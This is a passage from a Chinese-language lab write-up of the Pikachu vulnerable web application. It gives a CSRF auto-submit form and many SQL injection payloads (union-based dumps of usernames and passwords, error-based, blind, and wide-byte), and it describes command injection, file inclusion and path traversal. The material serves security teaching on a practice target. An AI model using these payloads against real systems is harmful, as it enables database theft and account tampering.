title="CSRF(get)"></a>CSRF(get)</h2><p>登号，修改信息，抓包，老套路，发现修改的个人信息直接是拼接到 url 地址里</p><p><code>/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=13677676754&amp;add=Oklahoma+City+Thunder&amp;email=kevin%40pikachu.com&amp;submit=submit</code>，于是可以自己修改 url 里面的内容，点击既可修改信息</p><p>payload：<code>/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=123456789&amp;add=GUET&amp;email=hanhan%40pikachu.com&amp;submit=submit</code></p><blockquote><p>百度说实战的时候可以构造 url 发送给受害者，点击即发送了 get 请求修改了自己的个人信息</p></blockquote><p><img src="https://s1.ax1x.com/2020/09/19/wI0nfg.png"></p><p>攻击成功</p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>登号，修改信息，抓包，老套路，名字提示是 post 所以修改的个人信息直接是在 post 表单里，但是不懂怎么利用，我要是能抓到人家用户自己修改自己的个人信息包我还攻击个锤子，百度说&#x3D;&#x3D;攻击者可以搭建一个站点，在站点上做一个表单，诱导受害者点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息&#x3D;&#x3D;，直接贴代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://www.tests.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;body&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456789&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;vince@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>诱导受害者点击[<a href="http://www.tests.com/vul/csrf/csrfpost/post.html]%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%BB%93%E5%90%88">www.tests.com/vul/csrf/csrfpost/post.html]就行了，可以结合</a> xss 来攻击</p><p><img src="https://s1.ax1x.com/2020/09/19/wIBYDI.png"></p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>登号，修改信息，抓包，老套路，修改个人信息依旧是拼接在 url 里面，但是多加了一个 token 值且每次提交后在返回包里有新的 token 值，这里应该是一个漏洞点，但是我的水平打不了，知道有这回事，以后再回来填坑</p><blockquote><p>使用 token 感觉是一个很好的防御 CSRF 攻击的方法</p></blockquote><h1 id="SQL-Inject-SQL注入漏洞"><a href="#SQL-Inject-SQL注入漏洞" class="headerlink" title="SQL-Inject(SQL注入漏洞)"></a>SQL-Inject(SQL注入漏洞)</h1><h2 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h2><p>哦,SQL注入漏洞，可怕的漏洞。<br>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<br><strong>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</strong><br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。<br>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：</p><ol><li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li><li>使用参数化（Parameterized Query 或 Parameterized Statement）；</li><li>还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!<br>SQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。</li></ol><h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>抓包，重放</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 order by 3# 抱错Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br><span class="line">1 order by 2# 正常回显，爆字段列数为2</span><br><span class="line">1 union select database()，user()# 得到回显hello,pikachu &lt;br /&gt;your email is: root@localhost，即爆数据库名为pikachu和数据库用户为root@localhost</span><br><span class="line">1 union select table_name,2 from information_schema.tables where table_schema = database()# 爆数据表</span><br><span class="line">id=1 union select database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;# 爆字段</span><br><span class="line">id=1 union select database(),group_concat(username,&#x27;:&#x27;,password) from users# 爆内容</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/19/wITob6.png"></p><p><img src="https://s1.ax1x.com/2020/09/19/wITIDx.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7oHMj.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7oTzQ.png"></p><h2 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h2><p>输入 kobe 发现有回显，结合字符型注入原理可以构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; or 1=1#</span><br><span class="line"># ’闭合掉前面的单引号，#注释掉后面的单引号</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/21/w7ooRg.png"></p><blockquote><p>字符型注入原理，这个一开始学sql注入老是转不过弯，现在理解了</p><p>注入点就是$_GET[‘id’]，传进去的参数是个字符串，前后都是有单引号包裹的，比如传进去 <code>C1everF0x&#39; or 1=1#</code>，结果就是 <code>&#39;C1everF0x&#39; or 1=1#&#39;</code>，前一个单引号 ’ 闭合掉前面的单引号的意思就是 C1everF0x 被前面自带的单引号和后面 payload 添加的单引号注释掉了，# 注释掉后面的单引号的意思就是 payload 里面传进去的 # 注释掉了本来用于闭合第一个单引号的单引号（这句话超级绕，但我感觉只能这样子表述了），中间的 <code>or 1=1</code> 就是 sql 注入攻击语句</p></blockquote><h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>先爆字段数，运气不错一次爆到字段列数为3，接着爆库，爆表，爆字段，爆内容一套带走</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; order by 3## 爆字段列数</span><br><span class="line">kobe&#x27; union select 1,database(),user()## 爆数据库名和用户名</span><br><span class="line">kobe&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()## 爆数据表</span><br><span class="line">kobe&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;## 爆字段</span><br><span class="line">kobe&#x27; union select 1,database(),group_concat(username,&#x27;:&#x27;,password) from users## 爆内容</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/21/w7oIJS.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7o5i8.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7obss.png"></p><p><img src="https://s1.ax1x.com/2020/09/21/w7oWZt.png"></p><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><blockquote><p>这个题一下子没反应过来是什么意思，去看了 wp 和源码知道是查询语句多了<code>()</code>包裹传进来的参数，所以用反括号闭合掉前面的括号，后面就是老套路一套带走了</p></blockquote><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27;) order by 2## 爆字段列数</span><br><span class="line">kobe&#x27;) union select database(),user()## 爆数据库名和用户名</span><br><span class="line">kobe&#x27;) union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()## 爆数据表</span><br><span class="line">kobe&#x27;) union select database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;## 爆字段</span><br><span class="line">kobe&#x27;) union select database(),group_concat(username,&#x27;:&#x27;,password) from users## 爆内容</span><br></pre></td></tr></table></figure><blockquote><p><strong>因为懒所以不截图了</strong></p><p><strong>在实际渗透测试过程中当然是看不到源码，所以就需要手工多测试，比如单引号和双引号这种，通过看回显报错判断</strong></p></blockquote><h2 id="“insert-x2F-update”注入（报错注入）"><a href="#“insert-x2F-update”注入（报错注入）" class="headerlink" title="“insert&#x2F;update”注入（报错注入）"></a>“insert&#x2F;update”注入（报错注入）</h2><blockquote><p>当我们往后端数据库中添加数据，SQL语句出错的时候可能出现这个漏洞</p><p>extractvalue(目标xml文档，xml路径)：第一个参数指定 xml 文档表的字段名称，第二个参数应该是合法的XPATH路径，使用方法跟下面的一样，少一个参数而已，下面的函数名好记</p><p>updatexml(1,concat(0x7e,database()),1)：第一个参数指定 xml 文档表的字段名称，第二个参数应该是合法的XPATH路径，如果不是就会引发报错的同事将传进去的参数进行输出，第三个是新的值,&#x3D;&#x3D;第一第二个参数没有卵用，关键是中间的数值，中间的数值也可以用表达式的形式，函数会把这个表达式执行了然后以报错的形式返回出来&#x3D;&#x3D;，这就是报错注入的原理</p></blockquote><p>提交一个用户为<code>a</code>密码为<code>\</code>后可以在页面上看到报错信息<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;\&#39;),&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;)&#39; at line 1</code>，构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,database())) and &#x27;# 爆出数据库名</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/21/w7ohIf.png"></p><blockquote><p><strong>这里遇到个疑惑，当用<code>#</code>代替<code>and &#39;</code>的时候会报错，不知道为啥，之后回来填坑</strong></p></blockquote><h2 id="“delete”注入-报错注入"><a href="#“delete”注入-报错注入" class="headerlink" title="“delete”注入(报错注入)"></a>“delete”注入(报错注入)</h2><p>点删除，抓包，id的值可以用来注入，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,database()))# 爆数据库</span><br></pre></td></tr></table></figure><h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><blockquote><p>这题没搞懂什么意思，去搜了百度</p></blockquote><p>后台开发人员为了验证客户端头信息，比如常用的 cookie 验证，或者通过 http 请求头信息获取客户端的一些信息，比如 useragent 、accept 字段等等，会对客户端的 http 请求头信息获取并使用 sql 进行处理，如果此时没有足够的安全考虑，则可能会导致基于 http 头的 sql 注入漏洞</p><p><img src="https://s1.ax1x.com/2020/09/21/w7oqLn.png"></p><p>抓包，重放，<code>User-Agent</code>、<code>Accept</code>和<code>Cookie</code>改为单引号都发现有报错，还是报错注入，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,database())) and &#x27;#爆数据库名</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/21/w7ofdP.png"></p><h2 id="布尔盲注-base-on-boolian"><a href="#布尔盲注-base-on-boolian" class="headerlink" title="布尔盲注(base on boolian)"></a>布尔盲注(base on boolian)</h2><p>判断是否是布尔注入，<code>kobe&#39; and 1=1#</code>正常回显，<code>kobe&#39; and 1=2#</code>报错</p><p>判断数据库名字长度，<code>kobe&#39; and length(database())&gt;0#</code> <code>kobe&#39; and length(database())&lt;8#</code>，二分法最后确定<code>kobe&#39; and length(database())=7#</code></p><p>爆数据库名字：<code>kobe&#39; and ascii(substr(database(),1,1))&gt;113#</code>，二分法确定值</p><p>手工注入不现实，一般是写脚本批量打出来，原理就是利用<code>and</code>后面语句结合页面是否正常回显来爆破出想要的东西</p><h2 id="时间盲注-base-on-time"><a href="#时间盲注-base-on-time" class="headerlink" title="时间盲注(base on time)"></a>时间盲注(base on time)</h2><p>与布尔注入原理一样，需要利用<code>sleep()</code>函数结合<code>if</code>条件语句加自己编写脚本来爆破想要的东西，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())=7,sleep(5),1)#</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><blockquote><p>这个注入是没有研究过的，直接贴概念和原理，方便以后回来看</p></blockquote><h3 id="涉及到的基本概念"><a href="#涉及到的基本概念" class="headerlink" title="涉及到的基本概念"></a>涉及到的基本概念</h3><ol><li><p>字符、字符集<br>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p></li><li><p>UTF8<br>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。</p></li><li><p>宽字节<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p></li></ol><h3 id="MySQL字符集转换过程"><a href="#MySQL字符集转换过程" class="headerlink" title="MySQL字符集转换过程"></a>MySQL字符集转换过程</h3><ol><li>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection</li><li>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：<ul><li>使用每个数据字段的CHARACTER SET设定值</li><li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)</li><li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值</li><li>若上述值不存在，则使用character_set_server设定值</li></ul></li><li>将操作结果从内部操作字符集转换为character_set_results</li></ol><p>&#x3D;&#x3D;宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码&#x3D;&#x3D;</p><h3 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h3><p>GBK占两个字节</p><p>ASCII占一个字节</p><p>PHP编码为GBK，函数执行添加的是ASCII编码（添加的符号为”\“)，MySQL默认字符集是GBK等宽字符集</p><p>当PHP转义（开启GPC、用addslashes函数，或者icov等）时，单引号会被加上反斜杠<code>\</code>，结果就是<code>\&#39;</code>，十六进制编码为<code>%5c%27</code>，如果在PHP转移前，单引号前加上<code>%df</code>，结果就是<code>%df%5c%27</code>，其中<code>%df%5c</code>会被当成宽字符编码，变成<code>縗</code></p><p>也就是<code>%df\&#39; </code>&#x3D; <code>%df%5c%27</code>&#x3D;<code>縗&#39;</code>，就有了单引号，方便注入</p><h3 id="这题的payload"><a href="#这题的payload" class="headerlink" title="这题的payload"></a>这题的payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1## 内容遍历</span><br></pre></td></tr></table></figure><h1 id="RCE-远程命令-x2F-代码执行"><a href="#RCE-远程命令-x2F-代码执行" class="headerlink" title="RCE(远程命令&#x2F;代码执行)"></a>RCE(远程命令&#x2F;代码执行)</h1><h2 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h2><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。<br><strong>远程系统命令执行</strong><br>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器<br>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”<br><strong>远程代码执行</strong><br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。<br>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p><h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><p>管道符直接拼接命令</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210315112536.png"></p><h2 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h2><p>用户输入参数直接拼接到<code>eval</code>函数的参数内，实现 RCE </p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210315112655.png"></p><h1 id="Files-Inclusion-文件包含漏洞"><a href="#Files-Inclusion-文件包含漏洞" class="headerlink" title="Files Inclusion(文件包含漏洞)"></a>Files Inclusion(文件包含漏洞)</h1><h2 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h2><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。<br>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。根据不同的配置环境，文件包含漏洞分为如下两种情况：<br><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。<br>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。<br>你可以通过“File Inclusion”对应的测试栏目，来进一步的了解该漏洞。</p><h2 id="File-inclusion-local"><a href="#File-inclusion-local" class="headerlink" title="File inclusion(local)"></a>File inclusion(local)</h2><p>可以包含网站下任意文件，配合目录穿越</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210315113230.png"></p><h2 id="File-inclusion-remote"><a href="#File-inclusion-remote" class="headerlink" title="File inclusion(remote)"></a>File inclusion(remote)</h2><p>本地 python 起一个局域网服务，整个文件包含进去就行</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210315130335.png"></p><h1 id="Unsafe-file-downloads-不安全的文件下载"><a href="#Unsafe-file-downloads-不安全的文件下载" class="headerlink" title="Unsafe file downloads(不安全的文件下载)"></a>Unsafe file downloads(不安全的文件下载)</h1><h2 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a>概述</h2><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来。从而导致后台敏感信息(密码文件、源代码等)被下载。<br>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p><h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><p>抓包改文件名目录穿越三层下载<code>index.php</code></p><h1 id="Unsafe-file-uploads-不安全的文件上传"><a href="#Unsafe-file-uploads-不安全的文件上传" class="headerlink" title="Unsafe file uploads(不安全的文件上传)"></a>Unsafe file uploads(不安全的文件上传)</h1><h2 id="概述-7"><a href="#概述-7" class="headerlink" title="概述"></a>概述</h2><p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。<br>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等</p><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><h2 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h2><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><h1 id="Over-Permisson-越权漏洞"><a href="#Over-Permisson-越权漏洞" class="headerlink" title="Over Permisson(越权漏洞)"></a>Over Permisson(越权漏洞)</h1><h2 id="概述-8"><a href="#概述-8" class="headerlink" title="概述"></a>概述</h2><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。<br>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。<br>因此，在在权限管理中应该遵守：</p><ol><li>使用最小权限原则对用户进行赋权;</li><li>使用合理（严格）的权限校验规则;</li><li>使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</li></ol><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><h1 id="x2F-x2F-x2F-目录遍历"><a href="#x2F-x2F-x2F-目录遍历" class="headerlink" title="..&#x2F;..&#x2F;..&#x2F;(目录遍历)"></a>..&#x2F;..&#x2F;..&#x2F;(目录遍历)</h1><h2 id="概述-9"><a href="#概述-9" class="headerlink" title="概述"></a>概述</h2><p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“..&#x2F;”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。<br>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。<br>需要区分一下的是,如果你通过不带参数的url（比如：<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82%E8%80%8C%E5%B9%B6%E4%B8%8D%E5%BD%92%E4%B8%BA%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E3%80%82%EF%BC%88%E5%85%B3%E4%BA%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%BD%A0%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%9C%A8&quot;i">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在&quot;i</a> can see you ABC”中了解更多）</p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h1 id="I-can-see-your-ABC-敏感信息泄露"><a href="#I-can-see-your-ABC-敏感信息泄露" class="headerlink" title="I can see your ABC(敏感信息泄露)"></a>I can see your ABC(敏感信息泄露)</h1><h2 id="概述-10"><a href="#概述-10" class="headerlink" 